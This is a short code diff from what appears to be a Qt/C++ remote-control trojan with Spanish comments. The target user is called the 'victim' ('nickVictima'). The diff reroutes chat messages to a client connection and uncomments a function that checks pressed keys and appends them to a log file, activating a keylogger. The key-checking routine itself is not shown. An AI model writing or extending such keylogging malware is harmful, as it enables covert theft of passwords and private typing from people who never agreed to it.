@@ -644,7 +644,7 @@ void MainWindow::enviarMensajeChat()
 {
     /** Envia un mensaje de chat al cliente **/
     this->ponerMensajeChat(this->enviarChatTexto->text(),this->nickVictima);
-    //util.escribirSocket ( "chat|@|" + this->enviarChatTexto->text() );
+    cliente.sendMessage(from,"chat|@|" + this->enviarChatTexto->text());
     this->enviarChatTexto->clear();
 }
 void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
@@ -655,18 +655,17 @@ void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
 void MainWindow::escucharTeclas()
 {
     /** Esta función comprueba que teclas hay pulsadas y las guarda en un archivo **/
-
-       /* log.open(QFile::Append);
         char num;
         num = comprobarTeclas();
 
         if(num != 0)
         {
+            log.open(QFile::Append);
             cadenaa.append(num);
             log.write(cadenaa);
             cadenaa.clear();
             log.close();
-        } */
+        }
 }
 
 paralelo::paralelo()
